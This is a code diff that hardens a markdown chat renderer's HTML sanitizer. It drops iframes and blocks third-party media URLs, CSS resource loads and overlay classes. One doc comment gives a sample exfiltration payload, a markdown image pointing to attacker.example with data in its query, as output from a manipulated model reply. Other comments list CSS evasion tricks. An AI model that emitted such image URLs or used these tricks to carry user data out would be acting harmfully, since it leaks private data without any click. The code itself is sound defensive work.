@@ -37,6 +37,7 @@
 import type { Element, ElementContent, Properties, Root, RootContent } from 'hast';
 import { defaultUrlTransform } from 'react-markdown';
 import { defaultSchema } from 'rehype-sanitize';
+import { absoluteHttpUrl, isAppOriginUrl, readAppOrigins, type AppOrigins } from '../../../utils/app-origins';
 import { createFenceTracker, isBlankLine } from '../../../utils/markdown-fences';
 
 // ---------------------------------------------------------------------------
@@ -49,8 +50,12 @@ import { createFenceTracker, isBlankLine } from '../../../utils/markdown-fences'
  *
  * `video` is deliberately NOT in the baseline: chat strips <video>
  * server-side and playback goes through the <Video> SSOT. The rich
- * composition opts back in via `extraAllowedHtmlTags={['video', 'source']}`
+ * composition opts back in via `extraAllowedHtmlTags`
  * so authored content (blog publisher video injection) keeps working.
+ *
+ * `iframe` is not in the baseline either: on the chat surface it put a
+ * third-party document inside the app, a ready-made phishing page. The rich
+ * composition opts back in the same way, for embeds pasted into posts.
  */
 export const SAFE_HTML_TAGS = new Set([
   // Block + inline text
@@ -134,12 +139,11 @@ export const SAFE_HTML_TAGS = new Set([
   'center',
   'font',
   'big',
-  // Media ('video' intentionally excluded — see the header comment)
+  // Media ('video' and 'iframe' intentionally excluded — see the header comment)
   'img',
   'picture',
   'source',
   'audio',
-  'iframe',
   'track',
   // Forms (rehype-raw allows them; mostly harmless for chat output)
   'button',
@@ -564,6 +568,91 @@ function srcsetHasUnsafeCandidate(srcset: string): boolean {
 const STRIP_ELEMENTS = new Set(['script', 'style', 'noscript', 'noembed', 'object', 'embed', 'applet', 'base', 'meta']);
 
 /**
+ * Attributes the browser fetches on its own the moment the element renders,
+ * with no click: `img`/`source`/`audio`/`track` `src`, `srcset`, `poster`.
+ */
+const MEDIA_URL_ATTRS = new Set(['src', 'srcset', 'poster']);
+
+/**
+ * A CSS declaration that can load a resource: `url(…)` (except a `url(#id)`
+ * reference into the same document, which inline SVG gradients use),
+ * `image-set(…)` / `image(…)` / `src(…)`, which take a bare string, and any
+ * backslash, because a CSS escape spells `url` without the letters
+ * (`u\72 l(…)`). Over-matching only drops decoration.
+ */
+const CSS_RESOURCE_RE = /\\|url\((?!\s*['"]?\s*#)|image(?:-set)?\(|\bsrc\(/i;
+
+/**
+ * CSS comments, unterminated ones included. The style parser behind React's
+ * `style` prop deletes them before it reads a value, so `posi`, a comment and
+ * `tion:fixed` arrive as `position:fixed`, and `u`, a comment and `rl(…)` as
+ * `url(…)`. Every check on a CSS value runs on the text with them removed,
+ * and the scrubbed style is written back without them.
+ */
+const CSS_COMMENT_RE = /\/\*[\s\S]*?(?:\*\/|$)/g;
+const stripCssComments = (css: string): string => css.replace(CSS_COMMENT_RE, '');
+
+/**
+ * SVG presentation attributes that take a `url(…)` to another document's
+ * paint server, marker, clip path, mask or filter (hast keys, lowercased). A
+ * browser fetches a cross-origin one as soon as the element renders.
+ */
+const SVG_URL_ATTRS = new Set([
+  'fill',
+  'stroke',
+  'markerstart',
+  'markermid',
+  'markerend',
+  'clippath',
+  'mask',
+  'filter',
+]);
+
+/**
+ * The classes the markdown pipeline puts on its own elements (GFM task lists
+ * and footnotes, the code language). Untrusted content keeps only these: the
+ * app's utility classes are in the page's CSS, so `<div class="fixed inset-0
+ * z-50">` is the same full-page overlay the style guard strips, spelled as
+ * classes.
+ */
+const PIPELINE_CLASSES = new Set([
+  'task-list-item',
+  'contains-task-list',
+  'footnotes',
+  'sr-only',
+  'data-footnote-backref',
+]);
+const isPipelineClass = (name: string): boolean => PIPELINE_CLASSES.has(name) || /^language-[\w+#-]+$/.test(name);
+
+function hasRemoteMediaUrl(attr: string, value: string, origins: AppOrigins): boolean {
+  if (attr !== 'srcset') return !isAppOriginUrl(value.trim(), origins);
+  return value.split(',').some(candidate => !isAppOriginUrl(candidate.trim().split(/\s+/)[0] ?? '', origins));
+}
+
+export interface RehypeStripUnsafeOptions {
+  /**
+   * Let media load from any origin. Off, media loads only from the app (see
+   * `isAppOriginUrl`): a third-party `src` / `srcset` / `poster`, every CSS
+   * declaration and SVG attribute that can load a resource are dropped. A
+   * third-party `img[src]` moves to `data-blocked-src`, where the `img`
+   * renderer draws a notice in its place (`ExternalMediaNotice`). Untrusted content
+   * must keep it off: an image URL is a request its author receives, and
+   * `![](https://attacker.example/?d=…)` in a model reply carries whatever the
+   * reply was made to put there, with no click.
+   */
+  allowRemoteMedia?: boolean;
+  /**
+   * The app's origins to decide against. Defaults to the app's origins when
+   * the plugin is built; the engine passes a snapshot so that a hydrating
+   * render gives the server's answer.
+   */
+  appOrigins?: AppOrigins;
+}
+
+/** The origins media may load from; `null` when it may load from anywhere (`allowRemoteMedia`). */
+type MediaOrigins = AppOrigins | null;
+
+/**
  * Returns `properties` with the unsafe attributes dropped or rewritten, or the
  * ORIGINAL object when nothing had to change.
  *
@@ -571,10 +660,13 @@ const STRIP_ELEMENTS = new Set(['script', 'style', 'noscript', 'noembed', 'objec
  * so a clean element keeps its own properties object — and, via
  * `scrubElement`, its node identity.
  */
-function scrubProperties(properties: Properties, tag: string): Properties {
+function scrubProperties(properties: Properties, tag: string, media: MediaOrigins): Properties {
   if (!properties || typeof properties !== 'object') return properties;
 
   let next: Properties | undefined;
+  // Set once the loop is over: the author's own `data-blocked-src`, wherever it
+  // falls in the key order, must not survive, and ours must.
+  let blockedSrc: string | null = null;
 
   for (const key of Object.keys(properties)) {
     const lower = key.toLowerCase();
@@ -602,6 +694,22 @@ function scrubProperties(properties: Properties, tag: string): Properties {
       delete next[key];
       continue;
     }
+    if (media && MEDIA_URL_ATTRS.has(lower)) {
+      const v = Array.isArray(raw) ? raw.join(',') : raw;
+      if (typeof v === 'string' && hasRemoteMediaUrl(lower, v, media)) {
+        next ??= { ...properties };
+        delete next[key];
+        if (tag === 'img' && lower === 'src') blockedSrc = absoluteHttpUrl(v, media);
+        continue;
+      }
+    }
+    if (media && SVG_URL_ATTRS.has(lower) && typeof raw === 'string') {
+      if (CSS_RESOURCE_RE.test(stripCssComments(raw))) {
+        next ??= { ...properties };
+        delete next[key];
+        continue;
+      }
+    }
     // OVERLAY / UI-REDRESS GUARD. `style` is allowed (a content audit found
     // real published posts relying on it for `div.takeaway`, table styling
     // and reddit blockquotes), but the positioning subset of CSS is not a
@@ -624,15 +732,36 @@ function scrubProperties(properties: Properties, tag: string): Properties {
     // header, say) loses it — deliberately, because there is no way to tell
     // it apart from the redress payload at this layer, and a sticky header is
     // a smaller loss than a full-page phishing surface.
-    if (lower === 'style' && typeof raw === 'string' && POSITIONING_DECL_RE.test(raw)) {
-      const cleaned = raw
+    const dropDecl = (decl: string) => POSITIONING_DECL_RE.test(decl) || (media !== null && CSS_RESOURCE_RE.test(decl));
+    const css = lower === 'style' && typeof raw === 'string' ? stripCssComments(raw) : null;
+    if (css !== null && (css !== raw || css.split(';').some(dropDecl))) {
+      const cleaned = css
         .split(';')
-        .filter(decl => !POSITIONING_DECL_RE.test(decl))
+        .filter(decl => !dropDecl(decl))
         .join(';')
         .trim();
       next ??= { ...properties };
       if (cleaned === '' || cleaned === ';') delete next[key];
       else next[key] = cleaned;
+    }
+  }
+
+  if (media) {
+    // The notice reads `data-blocked-src`; content must not write one of its own.
+    if ('dataBlockedSrc' in properties) {
+      next ??= { ...properties };
+      delete next.dataBlockedSrc;
+    }
+    if (blockedSrc) {
+      next ??= { ...properties };
+      next.dataBlockedSrc = blockedSrc;
+    }
+    const classes = properties.className;
+    if (Array.isArray(classes) && classes.some(c => !isPipelineClass(String(c)))) {
+      next ??= { ...properties };
+      const kept = classes.filter(c => isPipelineClass(String(c)));
+      if (kept.length) next.className = kept;
+      else delete next.className;
     }
   }
 
@@ -644,16 +773,32 @@ function scrubProperties(properties: Properties, tag: string): Properties {
  * and all); otherwise the element with its attributes scrubbed and its
  * children rebuilt. Returns the ORIGINAL node when nothing changed.
  */
-function scrubElement(node: Element): Element | undefined {
+function scrubElement(node: Element, media: MediaOrigins): Element | undefined {
   const tag = String(node.tagName ?? '').toLowerCase();
   if (STRIP_ELEMENTS.has(tag)) return undefined;
-  const properties = scrubProperties(node.properties, tag);
-  const children = scrubElementChildren(node.children);
+  const properties = scrubProperties(node.properties, tag, media);
+  let children = scrubElementChildren(node.children, media);
+  if (media && tag === 'a') children = blockedImagesAsText(children);
   if (properties === node.properties && children === node.children) return node;
   return { ...node, properties, children };
 }
 
-function scrubElementChildren(children: ElementContent[]): ElementContent[] {
+/**
+ * A third-party image inside a link (`[![alt](src)](href)`) becomes the link's
+ * text: a blocked-image notice inside a link would turn the notice itself into
+ * the thing to click. The reader still has the link; the image never loads.
+ */
+function blockedImagesAsText(children: ElementContent[]): ElementContent[] {
+  if (!children.some(c => c.type === 'element' && c.tagName === 'img' && c.properties.dataBlockedSrc)) return children;
+  return children.map(child => {
+    if (child.type !== 'element' || child.tagName !== 'img' || !child.properties.dataBlockedSrc) return child;
+    const alt =
+      typeof child.properties.alt === 'string' && child.properties.alt.trim() ? child.properties.alt : 'Image';
+    return { type: 'text', value: alt };
+  });
+}
+
+function scrubElementChildren(children: ElementContent[], media: MediaOrigins): ElementContent[] {
   const out: ElementContent[] = [];
   let changed = false;
   for (const child of children) {
@@ -661,7 +806,7 @@ function scrubElementChildren(children: ElementContent[]): ElementContent[] {
       out.push(child);
       continue;
     }
-    const kept = scrubElement(child);
+    const kept = scrubElement(child, media);
     if (kept === undefined) {
       changed = true;
       continue;
@@ -675,7 +820,8 @@ function scrubElementChildren(children: ElementContent[]): ElementContent[] {
 /**
  * Defense-in-depth strip pass: drops the never-safe elements outright and
  * scrubs event handlers, unsafe URL schemes, `iframe[srcdoc]` and the
- * positioning subset of `style` off everything else.
+ * positioning subset of `style` off everything else — and, unless
+ * `allowRemoteMedia`, every media URL from outside the app.
  *
  * A pure rebuild rather than an in-place walk. `rehype-raw` and
  * `rehype-sanitize` — the two passes immediately before this one in
@@ -689,7 +835,8 @@ function scrubElementChildren(children: ElementContent[]): ElementContent[] {
  * affect the result, and dropping a strip-listed element here removes exactly
  * the subtree the old `splice`-then-`return index` removed.
  */
-export function rehypeStripUnsafe() {
+export function rehypeStripUnsafe({ allowRemoteMedia = false, appOrigins }: RehypeStripUnsafeOptions = {}) {
+  const media: MediaOrigins = allowRemoteMedia ? null : (appOrigins ?? readAppOrigins());
   return (tree: Root): Root => {
     const out: RootContent[] = [];
     let changed = false;
@@ -698,7 +845,7 @@ export function rehypeStripUnsafe() {
         out.push(child);
         continue;
       }
-      const kept = scrubElement(child);
+      const kept = scrubElement(child, media);
       if (kept === undefined) {
         changed = true;
         continue;
